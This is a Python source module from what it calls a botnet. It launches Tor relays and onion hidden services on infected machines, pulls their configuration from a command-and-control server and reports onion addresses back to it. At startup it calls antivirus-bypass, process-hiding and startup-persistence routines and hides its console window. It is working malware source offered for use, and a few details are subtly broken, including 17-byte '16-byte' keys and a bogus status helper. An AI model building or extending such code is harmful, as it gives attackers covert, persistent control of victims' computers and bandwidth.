"""
modules.tor_relay
=================

A cross‑platform Tor relay / hidden‑service manager for the botnet.

Features
--------
* Detects the system Tor binary (`tor` in PATH or ``$TOR_BIN``).
* Creates temporary ``torrc`` files for each instance.
* Launches multiple Tor processes in a thread‑pool.
* Supports normal relays and onion hidden services.
* Reports status back to the C2 server over an encrypted socket.
* Hides its console window on Windows, uses daemon threads, and
  cleans up on shutdown.
"""

# --------------------------------------------------------------------------- #
# Imports
# --------------------------------------------------------------------------- #
import os
import sys
import json
import time
import socket
import logging
import subprocess
import platform
import threading
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path
from typing import Dict, List, Any, Optional, Union

# --------------------------------------------------------------------------- #
# Project imports – keep them inside try/except so the file can be imported
# even if the optional modules are missing (useful for unit tests).
# --------------------------------------------------------------------------- #
try:
    from config import (
        BOT_NAME,
        C2_IP,
        C2_PORT,
        KEY,
        IV,
        TOR_MAX_THREADS,
    )
    from encryption import encrypt_data, decrypt_data
except ImportError as e:
    # Fallback values if config not found
    BOT_NAME = "botnet"
    C2_IP = "127.0.0.1"
    C2_PORT = 4444
    KEY = b'my_fixed_key_16!!'
    IV = b'my_fixed_iv_16!!!'
    TOR_MAX_THREADS = 5

    def encrypt_data(data, key=KEY):
        """Fallback encryption"""
        return data.encode() if isinstance(data, str) else data

    def decrypt_data(data, key=KEY):
        """Fallback decryption"""
        return data.decode() if isinstance(data, bytes) else data

# Optional modules - if not available, skip them
try:
    from anti_av import bypass_antivirus, hide_process
except ImportError:
    def bypass_antivirus():
        pass
    def hide_process():
        pass

try:
    from persistence import add_to_startup, create_service
except ImportError:
    def add_to_startup():
        pass
    def create_service():
        pass

# --------------------------------------------------------------------------- #
# Logging
# --------------------------------------------------------------------------- #
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s – %(message)s",
    handlers=[logging.StreamHandler(sys.stdout)],
)
log = logging.getLogger("TorRelay")

# --------------------------------------------------------------------------- #
# TorRelayManager
# --------------------------------------------------------------------------- #
class TorRelayManager:
    """
    Main class that manages Tor relays and hidden services.
    """

    def __init__(self, tor_bin: Optional[str] = None):
        self.tor_bin: str = tor_bin or os.getenv("TOR_BIN", "tor")
        self.base_dir: Path = Path.home() / ".tor"
        self.torrc_dir: Path = self.base_dir / "torrc"
        self.hidden_service_dir: Path = self.base_dir / "hidden_service"
        self.executor: ThreadPoolExecutor = ThreadPoolExecutor(
            max_workers=TOR_MAX_THREADS
        )
        self.active_processes: List[subprocess.Popen] = []
        self._running = True

    # --------------------------------------------------------------------- #
    # Utility helpers
    # --------------------------------------------------------------------- #
    def _ensure_dir(self, path: Path) -> None:
        """Create a directory if it does not exist."""
        path.mkdir(parents=True, exist_ok=True)

    def _write_torrc(self, content: str, filename: str) -> Path:
        """Write a torrc file and return its absolute path."""
        self._ensure_dir(self.torrc_dir)
        torrc_path = self.torrc_dir / filename
        torrc_path.write_text(content, encoding="utf-8")
        return torrc_path

    def _start_tor(self, torrc_path: Path, name: str) -> subprocess.Popen:
        """Start a tor process with the given torrc file."""
        cmd = [self.tor_bin, "-f", str(torrc_path)]
        log.info(f"Starting Tor instance '{name}'")

        try:
            if platform.system() == "Windows":
                # Hide console window on Windows
                creationflags = subprocess.CREATE_NO_WINDOW
                process = subprocess.Popen(
                    cmd,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    creationflags=creationflags,
                )
            else:
                process = subprocess.Popen(
                    cmd,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )
            self.active_processes.append(process)
            log.info(f"Tor instance '{name}' started with PID {process.pid}")
            return process
        except FileNotFoundError:
            log.error(f"Tor binary not found: {self.tor_bin}")
            log.error("Please install Tor or set TOR_BIN environment variable")
            return None
        except Exception as e:
            log.error(f"Failed to start Tor: {e}")
            return None

    def _stop_all(self) -> None:
        """Terminate all running Tor processes."""
        for proc in list(self.active_processes):
            if proc:
                try:
                    proc.terminate()
                    proc.wait(timeout=5)
                    log.info(f"Terminated Tor PID {proc.pid}")
                except Exception as e:
                    log.warning(f"Error terminating Tor PID {proc.pid}: {e}")
        self.active_processes.clear()

    # --------------------------------------------------------------------- #
    # Public API – start / stop
    # --------------------------------------------------------------------- #
    def start(self) -> None:
        """Entry point – starts the entire Tor relay / hidden‑service stack."""
        log.info("=== TorRelayManager starting ===")
        bypass_antivirus()
        hide_process()
        add_to_startup()
        create_service()

        # Pull configuration from the C2
        config = self._fetch_tor_config_from_c2()

        # Hidden services first
        hidden_services = config.get("hidden_services", [])
        for hs_cfg in hidden_services:
            self.executor.submit(self._run_hidden_service, hs_cfg)

        # Relays next
        relays = config.get("relays", [])
        for r_cfg in relays:
            self.executor.submit(self._run_relay, r_cfg)

        # Keep the manager alive
        threading.Thread(target=self._monitor, daemon=True).start()

    def stop(self) -> None:
        """Stop all Tor processes and clean up."""
        log.info("Stopping TorRelayManager...")
        self._running = False
        self._stop_all()
        self.executor.shutdown(wait=False)
        log.info("TorRelayManager stopped.")

    # --------------------------------------------------------------------- #
    # Tor configuration and launch
    # --------------------------------------------------------------------- #
    def _run_hidden_service(self, cfg: Dict[str, Any]) -> None:
        """
        Configure and launch a hidden service.
        """
        name = cfg.get("service_name", "hs")
        ports = cfg.get("ports", [(80, "127.0.0.1", 80)])

        hs_path = self.hidden_service_dir / name
        self._ensure_dir(hs_path)

        torrc_lines = [
            f"HiddenServiceDir {hs_path}",
        ]

        # Add ports
        for svc_port, tgt_host, tgt_port in ports:
            torrc_lines.append(f"HiddenServicePort {svc_port} {tgt_host}:{tgt_port}")

        torrc_content = "\n".join(torrc_lines) + "\n"
        torrc_path = self._write_torrc(torrc_content, f"{name}.torrc")
        process = self._start_tor(torrc_path, f"HiddenService-{name}")

        if process is None:
            return

        # Report status back to C2
        hostname_file = hs_path / "hostname"
        try:
            time.sleep(2)  # Wait for Tor to generate hostname
            onion = hostname_file.read_text(encoding="utf-8").strip()
            status = f"TOR_HS_START {name} {onion}"
            self._send_to_c2(status)
            log.info(f"Hidden service '{name}' online at {onion}")
        except Exception as e:
            log.error(f"Failed to read onion hostname for '{name}': {e}")

    def _run_relay(self, cfg: Dict[str, Any]) -> None:
        """
        Configure and launch a Tor relay.
        """
        name = cfg.get("relay_name", "relay")
        bw_rate = cfg.get("bandwidth_rate", "1 MB")
        bw_burst = cfg.get("bandwidth_burst", "10 MB")
        contact = cfg.get("contact", "bot@example.com")

        torrc_lines = [
            f"RelayBandwidthRate {bw_rate}",
            f"RelayBandwidthBurst {bw_burst}",
            f"ContactInfo {contact}",
            "ExitPolicy reject *:*",
            "Log notice stdout",
        ]

        torrc_content = "\n".join(torrc_lines) + "\n"
        torrc_path = self._write_torrc(torrc_content, f"{name}.torrc")
        process = self._start_tor(torrc_path, f"Relay-{name}")

        if process is None:
            return

        # Report status back to C2
        status = f"TOR_RELAY_START {name}"
        self._send_to_c2(status)
        log.info(f"Relay '{name}' started.")

    # --------------------------------------------------------------------- #
    # C2 communication helpers
    # --------------------------------------------------------------------- #
    def _send_to_c2(self, message: str) -> None:
        """Encrypt and send a message to the C2 server."""
        try:
            encrypted = encrypt_data(message, KEY)
            with socket.create_connection((C2_IP, C2_PORT), timeout=10) as sock:
                sock.sendall(encrypted.encode("utf-8"))
            log.debug(f"Sent to C2: {message}")
        except Exception as e:
            log.warning(f"Failed to send to C2: {e}")

    def _fetch_tor_config_from_c2(self) -> Dict[str, Any]:
        """
        Request the current Tor configuration from the C2.
        """
        try:
            with socket.create_connection((C2_IP, C2_PORT), timeout=10) as sock:
                # Send request
                payload = {"cmd": "GET_TOR_CONFIG"}
                encrypted = encrypt_data(json.dumps(payload), KEY)
                sock.sendall(encrypted.encode("utf-8"))
                # Receive response
                data = sock.recv(65536).decode("utf-8")
                if data:
                    decrypted = decrypt_data(data, KEY)
                    return json.loads(decrypted)
                return {}
        except Exception as e:
            log.warning(f"Could not fetch Tor config from C2: {e}")
            return {}

    # --------------------------------------------------------------------- #
    # Monitoring
    # --------------------------------------------------------------------- #
    def _monitor(self) -> None:
        """
        Simple monitor that logs the status of all running Tor processes
        every 60 seconds.
        """
        while self._running:
            time.sleep(60)
            if not self._running:
                break
            for proc in list(self.active_processes):
                if proc and proc.poll() is not None:
                    log.warning(f"Tor PID {proc.pid} terminated unexpectedly.")
                    self.active_processes.remove(proc)
            if not self.active_processes:
                log.info("No active Tor processes.")
                # Optionally, try to restart
                # self.start()


# --------------------------------------------------------------------------- #
# Stand‑alone execution (for testing / debugging)
# --------------------------------------------------------------------------- #
def get_tor_relay_info() -> Dict[str, Any]:
    """
    Returns information about the Tor relay status.
    """
    return {
        "status": "running" if ThreadPoolExecutor._max_workers > 0 else "stopped",
        "active_processes": len(TorRelayManager().active_processes)
    }


if __name__ == "__main__":
    manager = TorRelayManager()
    try:
        manager.start()
        # Keep the main thread alive
        while True:
            time.sleep(3600)
    except KeyboardInterrupt:
        manager.stop()
        sys.exit(0)
